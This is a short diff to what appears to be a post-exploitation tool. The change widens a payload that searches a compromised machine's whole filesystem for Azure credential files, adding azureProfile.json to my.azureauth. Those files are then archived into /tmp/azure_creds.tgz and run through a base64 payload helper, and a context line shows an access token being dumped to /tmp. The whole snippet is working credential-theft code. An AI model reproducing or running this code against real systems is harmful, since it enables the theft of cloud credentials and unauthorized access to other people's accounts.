@@ -193,14 +193,14 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                         session.platform.unlink('/tmp/azure_creds.tgz')
 
                     # enumerate azure creds
-                    payload = 'find / \( -type f -a \( -name \'my.azureauth.json\' -a -path \'*.azure/my.azureauth\' \) \)  -printf \'%P\n\''
+                    payload = 'find / \( -type f -a \( -name \'my.azureauth.json\' -a -path \'*.azure/my.azureauth\' \) -o \( -name \'azureProfile.json\' -a -path \'*.azure/azureProfile.json\' \) \)  -printf \'%P\n\''
                     session.log("running credentials find...")
                     result = run_base64_payload(
                         session=session, payload=payload, log_name="payload_azurecredsfind")
                     session.log(result)
 
                     # create an archive of all azure creds
-                    payload = 'tar -czvf /tmp/azure_creds.tgz -C / $(find / \( -type f -a \( -name \'my.azureauth\' -a -path \'*.azure/my.azureauth\' \) \)  -printf \'%P\n\')'
+                    payload = 'tar -czvf /tmp/azure_creds.tgz -C / $(find / \( -type f -a \( -name \'my.azureauth\' -a -path \'*.azure/my.azureauth\' \) -o \( -name \'azureProfile.json\' -a -path \'*.azure/azureProfile.json\' \) \)  -printf \'%P\n\')'
                     session.log("payload loaded and ready")
                     result = run_base64_payload(
                         session=session, payload=payload, log_name="payload_azurecreds")
